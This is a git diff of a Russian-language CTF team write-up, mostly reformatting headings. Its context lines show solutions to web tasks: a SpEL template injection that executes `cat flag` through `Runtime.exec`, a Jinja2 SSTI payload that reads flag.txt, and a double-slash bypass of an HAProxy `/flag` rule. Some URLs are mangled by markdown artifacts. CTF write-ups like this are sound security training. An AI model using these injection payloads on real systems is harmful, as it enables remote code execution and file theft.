@@ -1,9 +1,10 @@
 # nto2024
-# Web1
+## CTF
+### Web1
 
 …
 
-# Web2
+### Web2
 
 1) Декомпилировали .jar файл при помощи jd-gui утилиты linux
 
@@ -15,7 +16,7 @@
 
 Ссылка: `http://192.168.12.13:809](http://192.168.12.13:8090/)0/doc/__${T(java.lang.Runtime).getRuntime().exec("cat flag")}__::..x`
 
-# Web3
+### Web3
 
 1) По конфигу прокси поняли, что haproxy запрещает доступ ко всем запросам, которые начинаются с `/flag`, попытались это обойти при помощи уязвимости Haproxy с переполнением Content-Length (request smuggling), но в итоге просто ввели `http://192.168.12.11:8001/](http://192.168.12.11:8001/)/flag` и получили доступ
 
@@ -25,7 +26,7 @@
 
 Ссылка:  `http://192.168.12.11:8001//flag?name={{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }](http://192.168.12.11:8001//flag?name=%7B%7B%20get_flashed_messages.__globals__.__builtins__.open(%22flag.txt%22).read()%20%7D)}`
 
-# Crypto1
+### Crypto1
 
 1) Предположили, что пинкод состоит из 4-ех цифр
 
